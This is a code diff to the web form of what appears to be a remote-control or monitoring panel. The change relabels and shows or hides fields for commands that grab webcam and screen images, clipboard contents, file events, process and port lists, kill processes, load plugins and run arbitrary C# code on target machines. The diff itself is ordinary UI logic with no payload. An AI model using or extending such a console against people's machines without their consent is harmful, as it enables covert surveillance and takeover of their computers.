@@ -49,12 +49,12 @@
         </div>
 
         <div class="form-group" id="filename_div">
-            <label for="FileName">File</label>
+            <label id="file_title" for="FileName">File</label>
             <input type="text" class="form-control" name="FileName" id="FileName" />
         </div>
 
-        <div class="form-group">
-            <label for="Parameters">Parameters</label>
+        <div class="form-group" id="parameters_div">
+            <label id="parameters_title" for="Parameters">Parameters</label>
             <span id="param_body">
                 <input type="text" class="form-control" name="Parameters" id="Parameters" />
             </span>
@@ -274,14 +274,62 @@
 
         $('#command').change(function () {
             var command = $(this).find(':selected').val();
+            $("#file_title").show().html("File");
+            $("#parameters_title").show().html("Parameters");
+            $("#parameters_div").show();
+            $("#filename_div").show();
+            $("#param_body").html('<input type="text" class="form-control" name="Parameters" id="Parameters" />');
             switch (command) {
+                case '@Library.ECommand.UPLOAD_IMAGE':
+                    $("#file_title").hide();
+                    $("#parameters_title").html("Quality (1-100)");
+                    $("#filename_div").hide();
+                    break;
+                case '@Library.ECommand.UPLOAD_WEBCAM_IMAGE':
+                    $("#file_title").hide();
+                    $("#parameters_title").html("Quality (1-100)");
+                    $("#filename_div").hide();
+                    break;
+                case '@Library.ECommand.UPLOAD_PROCESS_INFO':
+                    $("#parameters_div").hide();
+                    $("#filename_div").hide();
+                    break;
+                case '@Library.ECommand.KILL_PROCESS':
+                    $("#parameters_title").html("Process Name or ID");
+                    $("#filename_div").hide();
+                    break;
+                case '@Library.ECommand.UPLOAD_CLIPBOARD_DATA':
+                    $("#parameters_div").hide();
+                    $("#filename_div").hide();
+                    break;
+                case '@Library.ECommand.UPLOAD_FILE':
+                    $("#parameters_div").hide();
+                    break;
+                case '@Library.ECommand.UPLOAD_FILE_EVENTS':
+                    $("#parameters_div").hide();
+                    $("#filename_div").hide();
+                    break;
+                case '@Library.ECommand.UPLOAD_PORT_INFO':
+                    $("#parameters_div").hide();
+                    $("#filename_div").hide();
+                    break;
+                case '@Library.ECommand.SET_TRANSMISSION_INTERVAL':
+                    $("#parameters_title").html("Interval in ms");
+                    $("#filename_div").hide();
+                    break;
+                case '@Library.ECommand.EXECUTE_PLUGIN':
+                    $("#file_title").html("Plugin filename");
+                    break;
+                case '@Library.ECommand.KILL_PLUGIN':
+                    $("#file_title").html("Plugin filename");
+                    $("#parameters_div").hide();
+                    break;
                 case '@Library.ECommand.EXECUTE_CODE':
                     $("#filename_div").hide();
+                    $("#parameters_title").html("C# code (eg: MessageBox.Show(\"Hello World\");");
                     $("#param_body").html('<textarea rows="5" style="width:100%;" class="form-control" name="Parameters" id="Parameters"></textarea>');
                     break;
                 default:
-                    $("#filename_div").show();
-                    $("#param_body").html('<input type="text" class="form-control" name="Parameters" id="Parameters" />');
                     break;
             }
         });
